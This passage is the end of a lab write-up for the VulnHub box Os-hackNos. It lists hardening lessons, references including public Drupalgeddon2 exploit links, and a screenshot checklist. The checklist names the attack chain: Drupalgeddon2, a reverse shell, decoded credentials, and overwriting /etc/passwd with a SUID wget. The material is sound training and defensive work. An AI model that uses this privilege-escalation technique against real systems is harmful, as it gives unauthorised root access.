- **Audit SUID binaries.** Run `find / -perm -u=s -type f 2>/dev/null` regularly.
  A SUID `wget` is catastrophic — it lets any user overwrite any root-owned file.
- **Minimise privilege of web processes.** `www-data` should not be able to write
  to `/etc`, `/root`, or other users' home directories.
- **Monitor for writes to authentication files.** Any change to `/etc/passwd`,
  `/etc/shadow`, or new UID-0 accounts should raise an immediate alert.
- **Enforce strong authentication.** `Hacker@4514` and `hacked` are exactly the
  kinds of passwords that fall to a wordlist or a guess.
- **Restrict outbound traffic.** The reverse shell and the `wget` file pull both
  relied on the target reaching the attacker — egress filtering helps here.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub — hackNos: Os-hackNos entry: https://vulnhub.com/entry/hacknos-os-hacknos,401/
- CVE-2018-7600 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2018-7600
- Drupal SA-CORE-2018-002 advisory: https://www.drupal.org/sa-core-2018-002
- `Drupalgeddon2` exploit (dreadlocked): https://github.com/dreadlocked/Drupalgeddon2
- Exploit-DB 44449 (Drupalgeddon2): https://www.exploit-db.com/exploits/44449
- Author's own walkthrough (hackNos.com): https://www.hacknos.com/os-hacknos-1/
- Ivan Glinkin — "Os-hackNos 1 walkthrough": https://www.ivanglinkin.com/os-hacknos-1-walkthrough/
- GTFOBins — `wget` (when SUID): https://gtfobins.github.io/gtfobins/wget/

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-netdiscover.png` — `netdiscover`/`arp-scan` showing `192.168.56.101`
- [ ] `images/02-changelog.png` — `CHANGELOG.txt` showing Drupal **7.57**
- [ ] `images/03-decode.png` — Base64 → Brainfuck decoding to `james:Hacker@4514`
- [ ] `images/04-root-shell.png` — `id` showing `uid=0(root)` and `/root/root.txt`
- [ ] `images/05-nmap.png` — nmap showing SSH (22) and HTTP (80)
- [ ] `images/06-dirb.png` — `dirb` discovering `/drupal/`
- [ ] `images/07-drupalgeddon2.png` — Metasploit session as `www-data`
- [ ] `images/08-suid-find.png` — `find -perm -u=s` showing SUID `/usr/bin/wget`
- [ ] `images/09-openssl-hash.png` — `openssl passwd` generating our hash
- [ ] `images/10-passwd-overwrite.png` — SUID `wget -O /etc/passwd` in action

---

*hackNos: Os-hackNos is a perfect "first real box": it walks you from a default
web page to root through a famous CVE, a bit of decoding, and a single
misconfigured SUID binary. Try to solve each stage yourself before reading
ahead — the learning is in the enumeration.*
